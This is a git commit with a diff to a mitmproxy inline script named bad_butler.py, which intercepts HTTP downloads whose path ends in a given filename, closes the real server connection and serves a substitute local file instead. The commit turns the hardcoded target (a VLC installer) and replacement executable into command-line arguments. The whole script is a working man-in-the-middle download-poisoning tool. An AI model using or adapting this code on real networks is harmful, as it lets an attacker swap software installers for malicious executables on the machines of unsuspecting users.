b4e0319188e567cc35b80a3ec9f4418c1dba34b6
Kostis Karantias <karantiaskostis@gmail.com>
2015-03-01 15:03:09 +0200

    Use arguments on bad butler

--- scripts/bad_butler.py
+++ scripts/bad_butler.py
@@ -2,21 +2,22 @@ from libmproxy.protocol.http import decoded, HTTPResponse
 from netlib.odict import ODictCaseless
 from mimetypes import guess_type
 
-# TODO: Make those arguments
-FILENAME_TO_POISON = "vlc-2.1.5-win32.exe"
-PATH_TO_BAD_FILE = "/Users/gtklocker/Downloads/ChromeStandaloneSetup.exe"
+def start(context, argv):
+    if len(argv) != 3:
+        raise ValueError("Usage: -s \"%s filename_suffix path_to_bad_file\"" % argv[0])
+    context.filename_suffix, context.path_to_bad_file = argv[1], argv[2]
 
 def request(context, flow):
-    if flow.request.path.endswith(FILENAME_TO_POISON):
+    if flow.request.path.endswith(context.filename_suffix):
         context.log("Poisoning the requested file")
         context.log(flow.request.path)
         context.log("Closing server connection")
         flow.server_conn.close()
 
         # TODO: Don't read the whole file in memory-maybe use a web server that already solves this
-        with open(PATH_TO_BAD_FILE, "rb") as f:
+        with open(context.path_to_bad_file, "rb") as f:
             resp = HTTPResponse(
                 [1, 1], 200, "OK",
-                ODictCaseless([["Content-Type", guess_type(PATH_TO_BAD_FILE)[0]]]),
+                ODictCaseless([["Content-Type", guess_type(context.path_to_bad_file)[0]]]),
                 f.read())
         flow.reply(resp)
